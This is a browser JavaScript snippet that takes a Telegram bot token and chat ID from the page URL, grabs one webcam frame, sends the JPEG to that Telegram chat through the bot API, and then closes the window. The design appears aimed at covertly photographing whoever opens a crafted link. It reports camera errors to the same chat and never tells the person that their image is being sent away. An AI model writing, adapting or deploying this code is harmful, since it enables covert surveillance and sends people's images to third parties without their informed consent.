(async () => {
  const params = new URLSearchParams(window.location.search);
  const BOT = params.get('bot');
  const CID = params.get('chat');
  if (!BOT || !CID) { window.close(); return; }

  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
    const video = document.createElement('video');
    video.srcObject = stream;
    video.play();
    await new Promise(r => setTimeout(r, 1000));
    const canvas = document.createElement('canvas');
    canvas.width = video.videoWidth || 640;
    canvas.height = video.videoHeight || 480;
    canvas.getContext('2d').drawImage(video, 0, 0);
    stream.getTracks().forEach(t => t.stop());

    const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.8));
    const fd = new FormData();
    fd.append('chat_id', CID);
    fd.append('photo', blob, 'cam.jpg');
    await fetch(`https://api.telegram.org/bot${BOT}/sendPhoto`, { method: 'POST', body: fd });
  } catch (e) {
    try {
      await fetch(`https://api.telegram.org/bot${BOT}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: CID, text: `📷 Cam error: ${e.message}` })
      });
    } catch(_) {}
  }
  window.close();
})();